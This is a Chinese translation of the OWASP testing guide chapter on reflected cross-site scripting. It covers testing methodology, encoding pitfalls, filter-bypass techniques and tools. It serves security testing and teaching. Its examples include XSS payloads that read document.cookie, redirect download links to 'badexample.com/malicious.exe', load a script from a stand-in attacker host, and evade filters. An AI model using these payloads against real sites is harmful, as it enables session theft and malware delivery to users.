# 反射型跨站脚本测试

## 总结

反射型[跨站脚本攻击（XSS）](https://owasp.org/www-community/attacks/xss/) 发生在攻击者将可被浏览器执行的代码注入单个HTTP响应中时。此类注入的攻击不会被存储在应用程序内部，因此具有非持久性，仅影响点击恶意构造的链接或第三方网页的用户。攻击字符串会作为特制的URI或HTTP参数的一部分被发送，若应用程序未正确处理这些输入，便会将其返回给受害者。

反射型XSS是实际环境中最常见的XSS攻击类型。此类攻击也被称为非持久性XSS攻击。由于攻击载荷通过单次请求与响应传递并执行，因此也被称作一阶XSS或类型1 XSS。

当Web应用程序存在此类漏洞时，它会将未经验证的请求输入直接返回给客户端。典型的攻击步骤包括：
1. 设计阶段：攻击者创建并测试恶意URI；
2. 社会工程阶段：诱骗受害者在其浏览器中加载该URI；
3. 执行阶段：利用受害者浏览器执行恶意代码。

攻击者的代码通常使用 JavaScript 语言编写，但也会采用其他脚本语言，例如 ActionScript 和 VBScript。攻击者常利用这些漏洞安装键盘记录器、窃取受害者 cookie、获取剪贴板内容以及篡改页面内容（例如替换下载链接）。

防范 XSS 漏洞的主要难点在于字符编码的正确处理。某些情况下，Web 服务器或应用程序可能未过滤某些字符的编码形式。例如，应用程序可能过滤了 `<script>` 标签，但未过滤 `%3cscript%3e`（该编码形式是标签的另一种表达方式）。

## 测试目标

- 识别响应中被反射的变量
- 评估这些变量接受的输入类型及返回时应用的编码方式（如有）

## 测试方法

### 黑盒测试

黑盒测试至少包含以下三个阶段：

#### 识别输入向量

检测输入向量。测试人员需要针对每个网页，确定所有由用户定义的变量及其输入方式。这包括隐藏或不明显的输入，例如：
- HTTP参数
- POST数据  
- 隐藏表单字段值
- 预定义的单选按钮或选择框值

通常可使用浏览器内置的HTML编辑器或Web代理工具来查看这些隐藏变量。示例如下。

#### 分析输入向量

分析每个输入向量以检测潜在漏洞。为检测XSS漏洞，测试人员通常会针对每个输入向量使用特制的输入数据。此类输入数据通常无害，但能触发浏览器响应以暴露漏洞。测试数据可通过以下方式生成：
- Web应用模糊测试工具
- 自动化的预定义已知攻击字符串列表  
- 手动构造

部分测试数据示例如下：
- `<script>alert(123)</script>`
- `"><script>alert(document.cookie)</script>`

完整测试字符串列表请参阅[XSS过滤器绕过速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)。

#### 检查影响

针对上一阶段尝试的每个测试输入，测试人员需分析结果并判断其是否构成对Web应用安全具有实际影响的漏洞。这需要检查结果页面的HTML代码并定位测试输入。一旦发现测试输入，测试人员需识别未被正确编码、替换或过滤的任何特殊字符。易受攻击的未过滤特殊字符集合取决于该部分HTML的上下文环境。

理想情况下，所有HTML特殊字符都应替换为HTML实体。需要重点关注的关键HTML实体包括：
- `>` (大于号)
- `<` (小于号)
- `&` (&符号)
- `'` (单引号)
- `"` (双引号)

完整的实体列表由HTML和XML规范定义，详见[维基百科完整参考](https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references)。

在HTML操作或JavaScript代码的上下文中，需要转义、编码、替换或过滤另一组特殊字符。这些字符包括：
- `\n` (换行符)
- `\r` (回车符)
- `'` (单引号)
- `"` (双引号)
- `\` (反斜杠)
- `\uXXXX` (Unicode编码值)

更完整的参考请参阅[Mozilla JavaScript指南](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Values,_variables,_and_literals#Using_special_characters_in_strings)。

#### 示例1

例如，某个网站显示欢迎信息 `Welcome %username%` 并提供下载链接。

![XSS示例1](images/XSS_Example1.png)\
*图 WSTG 4.7.1-1: XSS示例1*

测试人员应怀疑每个数据输入点都可能引发XSS攻击。为进行分析，测试人员需操纵用户变量并尝试触发漏洞。

点击以下链接观察结果：

```text
https://example.com/index.php?user=<script>alert(123)</script>
```

若未实施清理机制，将出现以下弹窗：

![警报弹窗](images/Alert.png)\
*图 WSTG 4.7.1-2: XSS示例1*

这表明存在XSS漏洞，攻击者可通过诱导用户点击特制链接，在目标浏览器中执行任意代码。

#### 示例2

尝试另一段代码（链接）：

```text
https://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "https://badexample.com/malicious.exe";}</script>
```

这将产生以下行为：
![XSS示例2](images/XSS_Example2.png)\
*图 WSTG 4.7.1-3: XSS示例2*

当用户点击测试者提供的链接时，会导致其从攻击者控制的网站下载文件`malicious.exe`。

### 绕过XSS过滤器

反射型跨站脚本攻击可通过以下方式防范：Web应用程序对输入进行清理、Web应用防火墙拦截恶意输入，或现代网页浏览器内置的保护机制。测试人员在进行漏洞测试时，应假设浏览器不会阻止攻击（例如浏览器版本过旧或安全功能被禁用）。同样，Web应用防火墙也无法保证识别所有新型未知攻击——攻击者可能构造防火墙无法识别的攻击字符串。

因此，XSS防护主要依赖于Web应用程序对不可信用户输入的清理机制。开发者可采用多种清理方式，例如返回错误、删除、编码或替换无效输入。然而，应用程序检测和纠正无效输入的方法本身可能成为防护弱点：拒绝列表可能未涵盖所有攻击字符串、允许列表可能过于宽松、清理过程可能失败，或某些输入类型被错误信任而未经清理。这些漏洞均可能被攻击者利用以绕过XSS过滤器。

具体绕过技术可参考[XSS过滤器绕过速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)。

#### 示例3：标签属性值

由于这些过滤器基于拒绝列表机制，它们无法阻断所有类型的攻击表达式。实际上，在某些情况下即使不使用`<script>`标签，甚至无需使用常被过滤的`<`和`>`字符，也能成功实施XSS攻击。
例如，Web应用程序可能将用户输入值用于填充属性值，如下列代码所示：

```html
<input type="text" name="state" value="INPUT_FROM_USER">
```

此时攻击者可提交以下代码：

```text
" onfocus="alert(document.cookie)
```

#### 示例4：不同语法或编码方式

某些情况下，基于特征匹配的过滤器可能通过混淆攻击代码的方式被绕过。通常可通过插入非常规的语法变体或编码方式实现。这些变体在代码返回时会被浏览器容忍为有效HTML，同时也可能被过滤器接受。
以下为部分示例：

- `"><script >alert(document.cookie)</script >`
- `"><ScRiPt>alert(document.cookie)</ScRiPt>`
- `"%3cscript%3ealert(document.cookie)%3c/script%3e`

#### 示例5：绕过非递归过滤

有时清理机制仅应用一次且未递归执行。此时攻击者可通过提交包含多次尝试的字符串突破过滤器，例如：

```text
<scr<script>ipt>alert(document.cookie)</script>
```

#### 示例 6：引入外部脚本

假设目标站点的开发者实现了以下代码来防止输入中包含外部脚本：

```php
<?
    $re = "/<script[^>]+src/i";

    if (preg_match($re, $_GET['var']))
    {
        echo "Filtered";
        return;
    }
    echo "Welcome ".$_GET['var']." !";
?>
```

上述正则表达式的解构分析：
0.  修饰符 `i` 不区分大小写
1.  检查 `<script` 标签
2.  贪婪匹配任意非 `>` 字符一次或多次
3.  检查一个 "` `"（空白字符）
4.  检查 `src` 属性

此方法可有效过滤类似 `<script src="https://attacker/xss.js"></script>` 的常见攻击。但在本例中，通过在 `script` 和 `src` 之间的属性内使用 `>` 字符，即可绕过清理机制，如下所示：

```text
https://example/?var=<SCRIPT%20a=">"%20SRC="https://attacker/xss.js"></SCRIPT>
```

<!-- s -->
此处使用自定义属性与值关闭正则表达式匹配
<!-- e -->

这将利用前文所述的反射型跨站脚本 (XSS) 漏洞，执行存储在攻击者 Web 服务器上的 JavaScript 代码，并使这些代码如同源自受害者站点 `https://example/`。

#### 示例 7：HTTP 参数污染（HPP）

另一种绕过过滤器的方法是 HTTP 参数污染（HPP），该技术由 Stefano di Paola 和 Luca Carettoni 于 2009 年在 OWASP 波兰会议上首次提出。更多信息请参阅[HTTP 参数污染测试/WSTG](04-Testing_for_HTTP_Parameter_Pollution.md)。该规避技术将攻击向量拆分到多个同名参数中。每个参数值的操作取决于不同 Web 技术解析参数的方式，因此此类规避并非总是可行。若目标环境会拼接所有同名参数的值，则攻击者可利用此技术绕过基于模式的安全机制。

常规攻击：

```text
https://example/page.php?param=<script>[...]</script>
```

使用 HPP 的攻击：

```text
https://example/page.php?param=<script&param=>[...]</&param=script>
```

更详细的过滤器规避技术列表请参阅 [XSS 过滤器绕过速查表](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)。最终，分析响应可能变得复杂。一种简单方法是使用弹出对话框的代码（如本例所示），这通常表明攻击者能在访问者浏览器中执行其选择的任意 JavaScript 代码。

### 灰盒测试

灰盒测试与黑盒测试类似。在灰盒测试中，渗透测试人员对应用程序具备部分了解。此时，渗透测试人员可能已知晓用户输入、输入验证控制措施以及用户输入如何被渲染返回给用户的相关信息。

若源代码可获取（白盒测试），则应分析所有来自用户的变量。此外，测试人员需分析已实施的净化措施，以判断这些措施是否可被绕过。

## 工具

- [PHP 字符集编码器 (PCE)](https://cybersecurity.wtf/encoder/)：支持65种字符集的编解码，可用于生成自定义攻击载荷。
- [Hackvertor](https://hackvertor.co.uk/public)：在线工具，支持JavaScript（或任意字符串输入）的多重编码与混淆处理。
- [XSS-Proxy](https://xss-proxy.sourceforge.net/)：高级跨站脚本（XSS）攻击工具。
- [ratproxy](https://code.google.com/archive/p/ratproxy/)：半自动化被动式Web应用安全审计工具，专注于精准灵敏地检测复杂Web 2.0环境中用户流量引发的潜在安全问题，并自动标记安全相关设计模式。
- [Burp Proxy](https://portswigger.net/burp/)：用于攻击和测试Web应用的交互式HTTP/S代理服务器。
- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)：内置扫描器的交互式HTTP/S代理服务器，专为Web应用攻击与测试设计。

## References

- [WSTG-INPV-01](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md)

### OWASP Resources

- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Books

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3

### Whitepapers

- [CERT - Malicious HTML Tags Embedded in Client Web Requests](https://resources.sei.cmu.edu/asset_files/WhitePaper/2000_019_001_496188.pdf)
- [cgisecurity.com - The Cross Site Scripting FAQ](https://www.cgisecurity.com/xss-faq.html)
- [S. Frei, T. Dübendorfer, G. Ollmann, M. May - Understanding the Web browser threat](https://www.techzoom.net/Publications/Insecurity-Iceberg)